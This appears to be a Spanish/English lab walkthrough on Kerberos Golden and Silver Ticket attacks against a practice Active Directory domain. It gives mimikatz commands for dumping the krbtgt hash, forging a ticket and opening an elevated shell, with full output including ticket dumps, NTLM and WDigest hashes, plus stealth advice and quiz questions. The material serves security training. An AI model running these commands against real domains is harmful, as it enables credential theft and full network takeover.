GZJik6rZNrl9KjpIjPmE/yoCBsouVXUZKqOpNuwFVG6WPEzVw/NB1P1ZA+tPfFzGHkS5N8ApunI2TwxgdABGLl+pPEFGxXKcnSuThXUbcnLncTwlsf3Na4zjbm944wLCnuSee2m2QTdfvnQitwAJ2HH810aZIy48mWYkHp6mdnCLtmBbE0s2KVxuMJIYLVt9vLELC7ApeFciYhRwL6NW/Xd3QL65Eb9MtUbrWmZn+DdUFUuRzjdDO5UK4f6fg/juPESTUoKZOKx/AiFLVoXjI+sZfqhdZgilUGf3KLtEpeUVye5TlcQj4fUcqdjLU3Ry2clIh+AfV/Y73VxcY81CyltuejScoHTlA6QnbomsNoeMZCRteYe4neCWApqcH0heFEZMUEY7Uw57X7QOr1TEgQrrwVZRpVmLlkHtYYA+TA22HBlefCLtpoXXUBGAfARlxlJGvu3e13jU4Y4ZDAOxIeCQXpDRf+rpdvKHqwxKzzedu+3hgXGsU1gOrAwqzPFDUpTW+DByaHlh45OzgNDBtLYooIWzQKzEMrm5qVHQwoJwJ9j6ha2O4neB46m2e1AhQcUtAsRweOWOraBMOhKF6UDbbNfVtQbkrv1RpXLggP1SsToVDB1MHSqkP/vrqZtMGCqpSznllho6Pn81GK14UiphftZAApMGN1EX3+fL8PDYAgEWb/UFrKWaz4QqiwhKbxPSEpjo6JDWKlIZcmgLrLzvzOTPWIzxma/OVuoCBDjtKwI6NW4YGWPMfcIYmgpFWHM5PQy/vVu7+WiiqsErn85aQx5mQeYOnwtdMUkkF4vBz7ItynyAugbd069CgV0TNOBYhkRhi9cJvIRyrs+Yx5sZYNDZiaUCA4F4OfNBaZGHIBF8bGB/LR34X6aZM1YNKJwdy1WZ5pOqIEHM0YSlT40fYxJkFD5PQitWJAupYgK87AzQKUpZab+RenjV3tUpjZ9llMrWlxrVCU+mbHwM0dm7EujAnlEUJDEWbRC2o4IBAjCB/6ADAgEAooH3BIH0fYHxMIHuoIHrMIHoMIHloCswKaADAgESoSIEIJFzQDsinw+sdjOKeK11xBWuNA+ugMbTBDOngQLfErxgoRIbEENPTlRST0xMRVIuTE9DQUyiGjAYoAMCAQGhETAPGw1DT05UUk9MTEVSLTEkowcDBQBApQAApREYDzIwMjUwODA1MTgzMzQ5WqYRGA8yMDI1MDgwNjA0MzM0OVqnERgPMjAyNTA4MTIxODMzNDlaqBIbEENPTlRST0xMRVIuTE9DQUypMDAuoAMCAQKhJzAlGwRsZGFwGx1DT05UUk9MTEVSLTEuQ09OVFJPTExFUi5sb2NhbA==


    ServiceName           :  LDAP/CONTROLLER-1
    ServiceRealm          :  CONTROLLER.LOCAL
    UserName              :  CONTROLLER-1$
    UserRealm             :  CONTROLLER.LOCAL
    StartTime             :  8/5/2025 11:33:49 AM
    EndTime               :  8/5/2025 9:33:49 PM
    RenewTill             :  8/12/2025 11:33:49 AM
    Flags                 :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
    KeyType               :  aes256_cts_hmac_sha1
    Base64(key)           :  aNBBZqeVq+pm5JuxskuwknourdDltkVYPZLoy5xdhRc=
    Base64EncodedTicket   :

      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













# Golden/Silver Ticket Attacks w/ mimikatz

# Mimikatz es una herramienta de posexplotación muy popular y poderosa que se usa más comúnmente para volcar credenciales de usuario dentro de una red de directorio activo; sin embargo, usaremos mimikatz para volcar un TGT desde la memoria LSASS

A silver ticket can sometimes be better used in engagements rather than a golden ticket because it is a little more discreet. If stealth and staying undetected matter then a silver ticket is probably a better option than a golden ticket however the approach to creating one is the exact same. The key difference between the two tickets is that a silver ticket is limited to the service that is targeted whereas a golden ticket has access to any Kerberos service.

A specific use scenario for a silver ticket would be that you want to access the domain's SQL server however your current compromised user does not have access to that server. You can find an accessible service account to get a foothold with by kerberoasting that service, you can then dump the service hash and then impersonate their TGT in order to request a service ticket for the SQL service from the KDC allowing you access to the domain's SQL server.











Dump the krbtgt hash -

﻿1.) cd downloads && mimikatz.exe - navigate to the directory mimikatz is in and run mimikatz

2.) privilege::debug - ensure this outputs [privilege '20' ok]

﻿3.) lsadump::lsa /inject /name:krbtgt 
- This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.





mimikatz # lsadump::lsa /inject /name:krbtgt
Domain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860

RID  : 000001f6 (502)
User : krbtgt

 * Primary
    NTLM : 72cd714611b64cd4d5550cd2759db3f6
    LM   :
  Hash NTLM: 72cd714611b64cd4d5550cd2759db3f6
    ntlm- 0: 72cd714611b64cd4d5550cd2759db3f6
    lm  - 0: aec7e106ddd23b3928f7b530f60df4b6

 * WDigest
    01  d2e9aa3caa4509c3f11521c70539e4ad
    02  c9a868fc195308b03d72daa4a5a4ee47
    03  171e066e448391c934d0681986f09ff4
    04  d2e9aa3caa4509c3f11521c70539e4ad
    05  c9a868fc195308b03d72daa4a5a4ee47
    06  41903264777c4392345816b7ecbf0885
    07  d2e9aa3caa4509c3f11521c70539e4ad
    08  9a01474aa116953e6db452bb5cd7dc49
    09  a8e9a6a41c9a6bf658094206b51a4ead
    10  8720ff9de506f647ad30f6967b8fe61e
    11  841061e45fdc428e3f10f69ec46a9c6d
    12  a8e9a6a41c9a6bf658094206b51a4ead
    13  89d0db1c4f5d63ef4bacca5369f79a55
    14  841061e45fdc428e3f10f69ec46a9c6d
    15  a02ffdef87fc2a3969554c3f5465042a
    16  4ce3ef8eb619a101919eee6cc0f22060
    17  a7c3387ac2f0d6c6a37ee34aecf8e47e
    18  085f371533fc3860fdbf0c44148ae730
    19  265525114c2c3581340ddb00e018683b
    20  f5708f35889eee51a5fa0fb4ef337a9b













Create a Golden/Silver Ticket - 

﻿1.) Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:1103


- This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.

I'll show you a demo of creating a golden ticket it is up to you to create a silver ticket.





mimikatz # Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:1103
User      : Administrator
Domain    : controller.local (CONTROLLER)
SID       : S-1-5-21-432953485-3795405108-1502158860
User Id   : 1103
Groups Id : *513 512 520 518 519
ServiceKey: 72cd714611b64cd4d5550cd2759db3f6 - rc4_hmac_nt
Lifetime  : 8/6/2025 2:50:54 PM ; 8/4/2035 2:50:54 PM ; 8/4/2035 2:50:54 PM
-> Ticket : ticket.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !

mimikatz #





Use the Golden/Silver Ticket to access other machines -

﻿1.) misc::cmd 

      - this will open a new elevated command prompt with the given ticket in mimikatz.

dir \\10.201.3.6\admin$


2.) Access machines that you want, what you can access will depend on the privileges of the user that you decided to take the ticket from however if you took the ticket from krbtgt you have access to the ENTIRE network hence the name golden ticket; however, silver tickets only have access to those that the user has access to if it is a domain admin it can almost access the entire network however it is slightly less elevated from a golden ticket.



This attack will not work without other machines on the domain however I challenge you to configure this on your own network and try out these attacks.

Answer the questions below
What is the SQLService NTLM Hash?

________________________________

Submit
What is the Administrator NTLM Hash?

